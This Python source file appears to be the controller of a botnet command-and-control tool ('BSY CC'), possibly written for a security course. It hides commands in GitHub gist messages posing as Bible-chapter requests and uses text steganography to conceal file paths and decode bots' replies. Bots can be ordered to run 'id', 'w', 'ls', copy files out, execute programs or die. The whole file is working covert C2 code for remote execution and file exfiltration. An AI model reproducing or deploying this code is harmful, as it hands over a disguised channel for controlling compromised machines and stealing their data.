import sys
import uuid
from datetime import datetime
from pytimedinput import timedInput
from time import sleep

sys.path.append('..')
from common.utils import add_message, get_replies_to_msg_id, read_attachment, reset_gist
from common.utils import CONTROLLER_NICK_NAME, BOT_SLEEP_TIME
from common.gist import init_gist
from common.chapters import get_chapter_for_path_encoding, get_chapter_for_command, read_chapter
from common.steganography import encode_to_text, decode_from_text


HEARTBEAT_TIME = 30


def encode_path(pth):
    chapter_for_encoding = get_chapter_for_path_encoding()
    chapter_text = read_chapter(chapter_for_encoding)
    encoded_pth, used_length = encode_to_text(pth, chapter_text)
    return encoded_pth[0:used_length]


def check_heartbeat():
    print('Checking heartbeat...', flush=True)
    msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
    now = datetime.now()

    print(f'Waiting for replies ({BOT_SLEEP_TIME + 5} seconds)...', flush=True)
    for i in range(BOT_SLEEP_TIME + 5):
        print('.', end='', flush=True)
        sleep(1)
    print('.', flush=True)

    replies = get_replies_to_msg_id(msg_id, CONTROLLER_NICK_NAME)
    bot_names = list(map(lambda x: x[0], replies))
    bot_names_str = f' ({", ".join(bot_names)})' if len(bot_names) > 0 else ''
    print(f'Active bots ({now}): {len(bot_names)}{bot_names_str}', flush=True)


def process_cmd(cmd):
    if len(cmd) == 0:
        return

    cmd_parts = cmd.split(' ')

    if cmd == 'w' or cmd == 'id' or cmd == 'kill':
        print(f'Adding {cmd} command...')
        chapter = get_chapter_for_command(cmd)
        msg_id = add_message(f'Send me text of chapter {chapter}, please', CONTROLLER_NICK_NAME)
        print(f'Added {cmd} command as message with id {msg_id}', flush=True)

    elif len(cmd_parts) == 2 and (cmd_parts[0] == 'ls' or cmd_parts[0] == 'cp' or cmd_parts[0] == 'exec'):
        print(f'Adding {cmd_parts[0]} command...')
        chapter = get_chapter_for_command(cmd_parts[0])
        attach = {
            'name': str(uuid.uuid4()) + '.txt',
            'content': encode_path(cmd_parts[1]),
        }
        msg_id = add_message(f'Is this attachment part of chapter {chapter}?', CONTROLLER_NICK_NAME, attachment=attach)
        print(f'Added {cmd} command as message with id {msg_id}', flush=True)

    elif len(cmd_parts) == 2 and cmd_parts[0] == 'decode' and cmd_parts[1].isdigit():
        msg_id = int(cmd_parts[1])
        print(f'Decoding replies for message {msg_id}...')
        replies = get_replies_to_msg_id(msg_id, CONTROLLER_NICK_NAME)
        if len(replies) == 0:
            print(f'No reply for message {msg_id} found', flush=True)
        else:
            for reply in replies:
                text = read_attachment(reply[3])
                decoded = decode_from_text(text)
                print(f'Reply for message {msg_id} by {reply[0]}:')
                print(decoded, flush=True)

    elif cmd == 'reset gist':
        reset_gist()
        print('Gist reset to initial message', flush=True)

    else:
        print(f'Unknown command: {cmd}', flush=True)


def run():
    print('Controller is starting...')
    init_gist()
    print(f'Controller is running as {CONTROLLER_NICK_NAME}...')

    while True:
        cmd, timed_out = timedInput('BSY CC > ', timeout=HEARTBEAT_TIME)
        if timed_out:
            print('User is idle...')
            check_heartbeat()
        elif cmd == 'exit' or cmd == 'quit':
            print('Exiting BSY CC...')
            break
        else:
            process_cmd(cmd)


if __name__ == '__main__':
    run()
